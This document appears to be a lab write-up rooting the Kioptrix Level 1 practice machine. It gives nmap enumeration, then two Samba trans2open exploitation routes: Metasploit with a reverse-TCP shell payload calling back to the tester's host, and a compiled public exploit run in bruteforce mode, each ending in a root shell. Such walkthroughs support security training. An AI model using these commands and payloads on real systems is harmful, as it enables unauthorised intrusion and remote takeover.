
### Netdiscover
`netdiscover -r 192.168.58.0/24`

### Nmap
```
nmap -A -vv -T4 192.168.58.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 18:48 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Initiating Ping Scan at 18:48
Scanning 192.168.58.129 [2 ports]
Completed Ping Scan at 18:48, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:48
Completed Parallel DNS resolution of 1 host. at 18:48, 0.03s elapsed
Initiating Connect Scan at 18:48
Scanning 192.168.58.129 [1000 ports]
Discovered open port 139/tcp on 192.168.58.129
Discovered open port 111/tcp on 192.168.58.129
Discovered open port 22/tcp on 192.168.58.129
Discovered open port 443/tcp on 192.168.58.129
Discovered open port 80/tcp on 192.168.58.129
Discovered open port 32768/tcp on 192.168.58.129
Completed Connect Scan at 18:48, 1.12s elapsed (1000 total ports)
Initiating Service scan at 18:48
Scanning 6 services on 192.168.58.129
Completed Service scan at 18:48, 6.04s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.58.129.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 10.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Nmap scan report for 192.168.58.129
Host is up, received syn-ack (0.11s latency).
Scanned at 2025-03-02 18:48:27 IST for 17s
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
| 1024 35 109482092953601530927446985143812377560925655194254170270380314520841776849335628258408994190413716152105684423280369467219093526740118507720167655934779634416983599247086840099503203800281526143567271862466057363705861760702664279290804439502645034586412570490614431533437479630834594344497670338190191879537
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAKtycvxuV/e7s2cN74HyTZXHXiBrwyiZe/PKT/inuT5NDSQTPsGiyJZU4gefPAsYKSw5wLe28TDlZWHAdXpNdwyn4QrFQBjwFR+8WbFiAZBoWlSfQPR2RQW8i32Y2P2V79p4mu742HtWBz0hTjkd9qL5j8KCUPDfY9hzDuViWy7PAAAAFQCY9bvq+5rs1OpY5/DGsGx0k6CqGwAAAIBVpBtIHbhvoQdN0WPe8d6OzTTFvdNRa8pWKzV1Hpw+e3qsC4LYHAy1NoeaqK8uJP9203MEkxrd2OoBJKn/8EXlKAco7vC1dr/QWae+NEkI1a38x0Ml545vHAGFaVUWkffHekjhR476Uq4N4qeLfFp5B+v+9flLxYVYsY/ymJKpNgAAAIEApyjrqjgX0AE4fSBFntGFWM3j5M3lc5jw/0qufXlHJu8sZG0FRf9wTI6HlJHHsIKHA7FZ33vGLq3TRmvZucJZ0l55fV2ASS9uvQRE+c8P6w72YCzgJN7v4hYXxnY4RiWvINjW/F6ApQEUJc742i6Fn54FEYAIy5goatGFMwpVq3Q=
|   1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAvv8UUWsrO7+VCG/rTWY72jElft4WXfXGWybh141E8XnWxMCu+R1qdocxhh+4Clz8wO9beuZzG1rjlAD+XHiR3j2P+sw6UODeyBkuP24a+7V8P5nu9ksKD1fA83RyelgSgRJNQgPfFU3gngNno1yN6ossqkcMQTI1CY5nF6iYePs=
80/tcp    open  http        syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     syn-ack 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn syn-ack Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   syn-ack Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 400 Bad Request
|_ssl-date: 2025-03-02T14:20:33+00:00; +1h01m49s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce:5293:4723:e7fe:c28d:74ab:42d7:02f1
| SHA-1: 9c42:91c3:bed2:a95b:983d:10ac:f766:ecb9:8766:1d33
| -----BEGIN CERTIFICATE-----
| MIIEDDCCA3WgAwIBAgIBADANBgkqhkiG9w0BAQQFADCBuzELMAkGA1UEBhMCLS0x
| EjAQBgNVBAgTCVNvbWVTdGF0ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoT
| EFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVu
| aXQxHjAcBgNVBAMTFWxvY2FsaG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJ
| ARYacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4wHhcNMDkwOTI2MDkzMjA2WhcN
| MTAwOTI2MDkzMjA2WjCBuzELMAkGA1UEBhMCLS0xEjAQBgNVBAgTCVNvbWVTdGF0
| ZTERMA8GA1UEBxMIU29tZUNpdHkxGTAXBgNVBAoTEFNvbWVPcmdhbml6YXRpb24x
| HzAdBgNVBAsTFlNvbWVPcmdhbml6YXRpb25hbFVuaXQxHjAcBgNVBAMTFWxvY2Fs
| aG9zdC5sb2NhbGRvbWFpbjEpMCcGCSqGSIb3DQEJARYacm9vdEBsb2NhbGhvc3Qu
| bG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAM4BXiK5bWlS
| ob4B6a9ALmKDbSxqoMcM3pvGHscFsJs+fHHn+CjU1DX44LPDNOwwOl6Uqb+GtZJv
| 6juVetDwcTbbocC2BM+6x6gyV/H6aYuCssCwrOuVKWp7l9xVpadjITUmhh+uB81q
| yqopt//Z4THww7SezLJQXi1+Grmp3iFDAgMBAAGjggEcMIIBGDAdBgNVHQ4EFgQU
| 7OdRS0NrbNB8gE9qUjcw8LF8xKAwgegGA1UdIwSB4DCB3YAU7OdRS0NrbNB8gE9q
| Ujcw8LF8xKChgcGkgb4wgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEEBQADgYEA
| Vgrmpprfkmd8vy0E0UmZvWdIcDrIYRvUWcwSFwc6bGqJeJr0CYSB+jDQzA6Cu7nt
| xjrlXxEjHFBBbF4iEMJDnuQTFGvICQIcrqJoH3lqAO73u4TeBDjhv5n+h+S37CHd
| 1lvgRgoOay9dWaLKOyUThgKF2HcPWMZIj2froo5eihM=
|_-----END CERTIFICATE-----
32768/tcp open  status      syn-ack 1 (RPC #100024)

Host script results:
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|   MYGROUP<1e>          Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 1h01m48s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59982/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12121/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34239/udp): CLEAN (Failed to receive data)
|   Check 4 (port 11639/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:48
Completed NSE at 18:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.74 seconds
```

### Enumeration
- 22/tcp    open  ssh         syn-ack OpenSSH 2.9p2 (protocol 1.99)
- 80/tcp    open  http        syn-ack Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
- 111/tcp   open  rpcbind     syn-ack 2 (RPC #100000)
- 139/tcp   open  netbios-ssn syn-ack Samba smbd (workgroup: MYGROUP)
- 443/tcp   open  ssl/https   syn-ack Apache/1.3.20 (Unix)  (Red-Hat/Linux) 
- 32768/tcp open  status      syn-ack 1 (RPC #100024)
### SSH
- no exploit found for OpenSSH 2.9p2 
### Web
- Ideally [OpenFuck](https://www.exploit-db.com/exploits/764) should have worked (Precisely: [OpenFuck](https://github.com/exploit-inters/OpenFuck)) 
- But it wasn’t working 
### Samba
- `msfconsole`
- `search smb scanner` - as we don’t have details to search and exploit
- further:
```
   22  auxiliary/scanner/smb/smb_enumshares                            .                normal  No     SMB Share Enumeration
   23  auxiliary/scanner/smb/smb_enumusers                             .                normal  No     SMB User Enumeration (SAM EnumUsers)
   24  auxiliary/scanner/smb/smb_version                               .                normal  No     SMB Version Detection
   25  auxiliary/scanner/snmp/snmp_enumshares                          .                normal  No     SNMP Windows SMB Share Enumeration
   26  auxiliary/scanner/smb/smb_uninit_cred                           .                normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
   27  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec
```

- `use 24`
- and exploit:
  ```
  run
  [*] 192.168.58.129:139    -   Host could not be identified: Unix (Samba 2.2.1a)
  [*] 192.168.58.129:       - Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  ```
- got samba version `Samba 2.2.1a`
- On exploring I found two ways to exploit this

#### Method 1 (Metasploit):
- `search samba exploit`
- results:
  ```
  53  exploit/osx/samba/lsa_transnames_heap                        2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   54    \_ target: Automatic                                       .                .          .      .
   55    \_ target: Mac OS X 10.4.x x86 Samba 3.0.10                .                .          .      .
   56    \_ target: Mac OS X 10.4.x PPC Samba 3.0.10                .                .          .      .
   57    \_ target: DEBUG                                           .                .          .      .
   58  exploit/solaris/samba/lsa_transnames_heap                    2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
   59    \_ target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24          .                .          .      .
   60    \_ target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24        .                .          .      .
   61    \_ target: DEBUG                                           .                .          .      .
   62  exploit/freebsd/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)
   63  exploit/linux/samba/trans2open                               2003-04-07       great      No     Samba trans2open Overflow (Linux x86)
   64  exploit/osx/samba/trans2open                                 2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)
   65  exploit/solaris/samba/trans2open                             2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)
   66    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .          .      .
   67    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .          .      .
   68  exploit/windows/http/sambar6_search_results                  2003-06-21       normal     Yes    Sambar 6 Search Results Buffer Overflow
   69    \_ target: Automatic                                       .                .          .      .
   70    \_ target: Windows 2000                                    .                .          .      .
   71    \_ target: Windows XP    
   ```
- I faced some issues:
  ```
  [*] Started reverse TCP handler on 192.168.58.128:4444 
  [*] 192.168.58.129:139 - Trying return address 0xbffffdfc...
  .
  .
  .
  [*] Sending stage (1017704 bytes) to 192.168.58.129
  [*] 192.168.58.129 - Meterpreter session 1 closed.  Reason: Died
  [-] Meterpreter session 1 is not valid and will be close
  .
  .
  
  ```
- After a tiring hunt, I figured the reason: 
>   Just to back this issue, i am having the same problem too, everytime i spawn a reverse_tcp the end client connects i get a successful connection and then it dies straight away. ive seen a lot of this happening across googling so i think this is an issue with metasploit itself?
[Quoted from](https://github.com/rapid7/metasploit-framework/issues/10416#issuecomment-410239421)

- I checked the payload: `payload => linux/x86/meterpreter/reverse_tcp`
- Which is apparently an unstable payload (staged), hence we gotta switch to an unstaged payload
- payload set to `payload => linux/x86/shell_reverse_tcp`
- finally
```
  run
[*] Started reverse TCP handler on 192.168.58.128:4444 
[*] 192.168.58.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.58.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.58.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.58.129:139 - Trying return address 0xbffffafc...
[*] 192.168.58.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.58.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.58.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.58.129:139 - Trying return address 0xbffff6fc...
[*] Command shell session 3 opened (192.168.58.128:4444 -> 192.168.58.129:32771) at 2025-03-03 12:20:37 +0530

[*] Command shell session 4 opened (192.168.58.128:4444 -> 192.168.58.129:32772) at 2025-03-03 12:20:38 +0530
[*] Command shell session 5 opened (192.168.58.128:4444 -> 192.168.58.129:32773) at 2025-03-03 12:20:39 +0530
^C
Abort session 3? [y/N]  [*] Command shell session 6 opened (192.168.58.128:4444 -> 192.168.58.129:32774) at 2025-03-03 12:20:41 +0530
N
[*] Aborting foreground process in the shell session
//bin/sh: : command not found
whoami
root
```

#### Method 2 (Manually):
- We use [Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)
- Executing the file:
```
  gcc samba1.c -o samba1
- 
  ./samba1
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./samba1 [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode

./samba1 -b 0 192.168.58.129
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```